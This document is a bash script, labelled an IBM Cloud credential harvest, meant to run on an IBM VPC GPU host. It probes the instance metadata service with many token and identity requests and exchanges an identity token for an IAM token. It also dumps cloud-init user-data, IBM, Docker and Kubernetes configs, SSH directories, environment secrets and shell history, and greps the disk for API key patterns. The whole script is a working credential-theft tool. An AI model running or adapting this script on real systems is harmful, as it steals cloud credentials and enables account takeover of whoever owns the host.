#!/bin/bash
# IBM Cloud credential harvest. Runs on an IBM VPC GPU host.
set -u
S=""; [ "$(id -u)" != "0" ] && S="sudo -n"
echo "### HOST $(hostname) ID=$(id -un) UID=$(id -u) IP=$(hostname -I 2>/dev/null)"
echo "### SUDO $($S id 2>&1 | head -1)"
echo "### KERNEL $(uname -r) DMI=$(cat /sys/class/dmi/id/product_name 2>/dev/null)"
echo "### CLOUD-DATASOURCE $(cat /var/lib/cloud/data/status.json 2>/dev/null | head -c 400)"
echo "=== IMDS BATTERY ==="
probe(){ # name method url [extra...]
  n="$1"; m="$2"; u="$3"; shift 3
  out=$(curl -s -m 6 -o /tmp/ibmp.out -w '%{http_code} %{size_download}' -X "$m" "${@:-}" "$u" 2>/dev/null)
  echo "IMDS $n -> $out :: $(head -c 200 /tmp/ibmp.out | tr '\n' ' ')"
}
H='-H Metadata-Flavor: ibm'
probe v2_token_PUT_json PUT http://169.254.169.254/instance_identity/v1/token $H -d '{"expires_in":3600}'
probe v2_token_PUT_nodata PUT http://169.254.169.254/instance_identity/v1/token $H
probe v2_token_PUT_ttl PUT http://169.254.169.254/instance_identity/v1/token $H -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
probe classic_tok PUT http://169.254.169.254/latest/api/token $H -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
probe identdoc GET 'http://169.254.169.254/latest/dynamic/instance-identity/document' $H
probe identdoc_v2 GET 'http://169.254.169.254/identity?version=2022-03-01' $H
probe meta_json GET http://169.254.169.254/2018-06-01/metaData.json
probe iam_creds GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ $H
probe instance_v2 GET 'http://169.254.169.254/instance?version=2022-03-01' $H
probe vpc_v1 GET http://169.254.169.254/v1/instance?version=2021-11-01 $H
probe NOHDR_control GET http://169.254.169.254/latest/meta-data/instance-id
probe NOHDR_control2 GET 'http://169.254.169.254/instance_identity/v1/token'
TOK=$(cat /tmp/ibmp.out 2>/dev/null)
echo "=== tokenized reads (if any token) ==="
T=$(curl -s -m 6 -X PUT http://169.254.169.254/instance_identity/v1/token $H -d '{"expires_in":3600}' | python3 -c 'import sys,json
try: print(json.load(sys.stdin).get("access_token",""))
except: print("")' 2>/dev/null)
echo "TOKEN_LEN=${#T}"
if [ -n "$T" ]; then
  for P in '/instance?version=2022-03-01' '/identity?version=2022-03-01' '/instance/initialization?version=2022-03-01'; do
    echo "--- $P"; curl -s -m 6 -H "Authorization: Bearer $T" "http://169.254.169.254$P" | head -c 1200; echo
  done
  echo "--- iam exchange"
  curl -s -m 20 -X POST https://iam.cloud.ibm.com/identity/token -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: application/json' --data-urlencode 'grant_type=urn:ibm:params:oauth:grant-type:iam-jwt' --data-urlencode "assertion=$T" | head -c 600; echo
fi
echo "=== CLOUD-INIT USERDATA ==="
$S head -c 6000 /var/lib/cloud/instance/user-data.txt 2>/dev/null | tr -d '\000'; echo
$S ls -la /var/lib/cloud/instance/ /var/lib/cloud/instance/scripts 2>/dev/null | head -20
echo "=== IBM CONFIG FILES ==="
for f in /root/.ibm/* /etc/ibm/* /root/.bluemix/config.json /home/*/.bluemix/config.json /root/.config/ibmcloud/* /etc/ibmcloud/* /var/lib/ibm/* /root/.softlayer /etc/ibmcloud.conf; do
  [ -e "$f" ] && { echo "--- $f ($(stat -c%s "$f" 2>/dev/null) B)"; $S head -c 1500 "$f" 2>/dev/null; echo; }
done
echo "=== DOCKER/KUBE/SSH ==="
for f in /root/.docker/config.json /home/*/.docker/config.json /root/.kube/config /home/*/.kube/config /etc/kubernetes/*.json; do
  [ -e "$f" ] && { echo "--- $f ($(stat -c%s "$f" 2>/dev/null) B)"; $S head -c 800 "$f" 2>/dev/null; echo; }
done
$S ls -la /root/.ssh /home/*/.ssh 2>/dev/null | head -30
echo "=== ENV ==="
env | grep -aiE 'IBM|IC_API|IAM|BLUEMIX|APIKEY|TOKEN' | sed 's/\(=.\{10\}\).*/\1…/' | head -20
$S env 2>/dev/null | grep -aiE 'IBM|IC_API|IAM|BLUEMIX|APIKEY' | sed 's/\(=.\{10\}\).*/\1…/' | head -20
echo "=== GREP API KEY PATTERNS ==="
$S grep -raslE 'IBMCLOUD_API_KEY|IC_API_KEY|ibmcloud_api_key|iam.cloud.ibm.com/identity/token|bluemix.*api.?key|"apikey"' /etc /opt /root /home /var/lib/cloud /usr/local /srv 2>/dev/null | grep -vE 'pearl-gpu-miner|libcudart|/proc/' | head -25
echo "=== GREP HITS CONTEXT ==="
$S grep -rasohE '(IBMCLOUD_API_KEY|IC_API_KEY|ibmcloud_api_key)[=:" ]{1,3}[A-Za-z0-9_-]{20,}' /etc /opt /root /home /var/lib/cloud /usr/local 2>/dev/null | head -10
$S grep -rasohE '"[A-Za-z0-9_-]{40,50}"' /root/.bluemix /root/.config/ibmcloud /etc/ibm /var/lib/cloud 2>/dev/null | head -5
echo "=== HISTORY ==="
$S bash -c 'cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -aiE "ibmcloud|api.?key|iam" | head -20'
echo "=== T19 CLOUD LOG ==="
$S tail -c 3000 /var/log/t19-cloud.log 2>/dev/null | tr -d '\000'; echo
echo "HARVEST_DONE"
